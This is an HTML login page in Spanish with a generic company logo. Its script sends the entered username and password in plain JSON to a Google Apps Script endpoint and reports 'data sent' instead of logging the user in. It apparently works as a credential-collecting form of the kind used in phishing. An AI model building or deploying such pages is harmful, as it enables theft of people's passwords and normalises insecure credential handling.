<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Login</title>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css">
    <style>
        body {
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            background: linear-gradient(135deg, #1e3c72, #2a5298, #00d2ff);
        }
        .login-container {
            background: rgba(255, 255, 255, 0.9);
            padding: 30px;
            border-radius: 15px;
            box-shadow: 0 0 20px rgba(0, 0, 0, 0.2);
            width: 350px;
            text-align: center;
        }
        .login-container img {
            width: 100%;
            max-height: 80px;
            margin-bottom: 15px;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <img src="logo.png" alt="Logo de la Empresa">
        <h2 class="mb-3">Iniciar Sesión</h2>
        <form id="loginForm">
            <input type="text" id="usuario" class="form-control mb-3" placeholder="Usuario" required>
            <input type="password" id="clave" class="form-control mb-3" placeholder="Contraseña" required>
            <button type="submit" class="btn btn-primary w-100">Entrar</button>
        </form>
        <div id="mensaje" class="mt-3"></div>
    </div>

    <script>
        document.getElementById("loginForm").addEventListener("submit", function(event) {
            event.preventDefault();
            var usuario = document.getElementById("usuario").value;
            var clave = document.getElementById("clave").value;
            var data = { usuario: usuario, clave: clave };

            fetch("https://script.google.com/macros/s/AKfycbxH_qH2_rtfK5ac3gZYeTgfkidqrgCUXFT7cZdDuU_mhzTSCk4sryGDQhR-a06eX8TnLQ/exec", {
                method: "POST",
                body: JSON.stringify(data),
                headers: { "Content-Type": "application/json" }
            })
            .then(response => response.json())
            .then(data => {
                document.getElementById("mensaje").innerText = "Datos enviados exitosamente";
            })
            .catch(error => {
                console.error('Error:', error);
                document.getElementById("mensaje").innerText = "Error al enviar los datos";
            });
        });
    </script>
</body>
</html>
